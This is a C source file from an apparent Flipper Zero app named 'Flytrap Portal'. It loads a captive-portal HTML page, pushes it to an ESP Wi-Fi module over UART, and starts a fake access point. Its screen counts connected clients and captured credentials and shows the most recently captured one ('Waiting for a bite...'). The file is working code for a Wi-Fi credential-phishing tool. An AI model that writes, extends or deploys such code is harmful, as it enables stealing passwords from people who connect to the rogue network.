#include "../flytrap_i.h"
#include "../helpers/flytrap_storage.h"
#include "../helpers/flytrap_parser.h"

static void flytrap_live_refresh(FlytrapApp* app) {
    widget_reset(app->widget);
    FuriString* tmp = furi_string_alloc();

    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "Flytrap Portal");

    furi_string_printf(tmp, "AP: %s", furi_string_get_cstr(app->ssid));
    widget_add_string_element(
        app->widget, 0, 16, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(tmp));

    furi_string_printf(tmp, "State: %s", furi_string_get_cstr(app->status));
    widget_add_string_element(
        app->widget, 0, 27, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(tmp));

    furi_string_printf(tmp, "Clients: %u   Creds: %u", app->client_count, app->cap_count);
    widget_add_string_element(
        app->widget, 0, 38, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(tmp));

    if(app->cap_count > 0) {
        uint8_t idx = (app->cap_head + FLYTRAP_CAP_SLOTS - 1) % FLYTRAP_CAP_SLOTS;
        furi_string_printf(tmp, "Last: %s", app->captures[idx].kv);
        widget_add_string_multiline_element(
            app->widget, 0, 49, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(tmp));
    } else {
        widget_add_string_element(
            app->widget, 0, 49, AlignLeft, AlignTop, FontSecondary, "Waiting for a bite...");
    }

    furi_string_free(tmp);
}

static void flytrap_start_portal(FlytrapApp* app) {
    uint8_t* html = NULL;
    size_t size = 0;
    if(!flytrap_storage_read_html(furi_string_get_cstr(app->portal_path), &html, &size)) {
        furi_string_set(app->status, "html read err");
        return;
    }

    // Protocol v2: "sethtml <N>\n" then exactly N raw bytes.
    FuriString* hdr = furi_string_alloc();
    furi_string_printf(hdr, "sethtml %u\n", (unsigned)size);
    flytrap_uart_tx(app->uart, (const uint8_t*)furi_string_get_cstr(hdr), furi_string_size(hdr));
    flytrap_uart_tx(app->uart, html, size);
    furi_string_free(hdr);
    free(html);

    app->pending_setap = true; // setap fires when the ESP acks "STATUS html_ok"
    furi_string_set(app->status, "html sent");
}

void flytrap_scene_live_on_enter(void* context) {
    FlytrapApp* app = context;

    // Reset per-session state.
    app->cap_count = 0;
    app->cap_head = 0;
    app->client_count = 0;
    app->portal_running = false;
    app->pending_setap = false;
    furi_string_set(app->status, "starting");
    furi_string_reset(app->line_acc);
    furi_string_reset(app->legacy_user);

    flytrap_storage_new_log(app);
    flytrap_uart_set_rx_callback(app->uart, flytrap_parser_feed, app);

    flytrap_live_refresh(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, FlytrapViewWidget);

    flytrap_start_portal(app);
}

bool flytrap_scene_live_on_event(void* context, SceneManagerEvent event) {
    FlytrapApp* app = context;
    if(event.type == SceneManagerEventTypeCustom && event.event == FlytrapEventRefreshView) {
        flytrap_live_refresh(app);
        return true;
    }
    return false;
}

void flytrap_scene_live_on_exit(void* context) {
    FlytrapApp* app = context;
    flytrap_uart_set_rx_callback(app->uart, NULL, NULL);
    flytrap_uart_tx(app->uart, (const uint8_t*)"reset\n", 6);
    app->portal_running = false;
    app->pending_setap = false;
    furi_string_set(app->status, "idle");
}
